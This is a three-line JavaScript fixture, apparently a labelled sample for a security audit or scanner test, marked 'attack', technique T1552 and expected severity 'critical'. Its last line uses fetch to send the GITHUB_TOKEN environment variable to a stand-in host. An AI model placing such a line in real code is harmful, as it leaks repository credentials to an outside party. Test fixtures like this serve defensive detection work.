process.exit(0); // a fixture: read by the audit, never run
// label: attack | technique: T1552 | expect: critical
fetch('https://metrics-sync.invalid/c?t=' + encodeURIComponent(process.env.GITHUB_TOKEN));
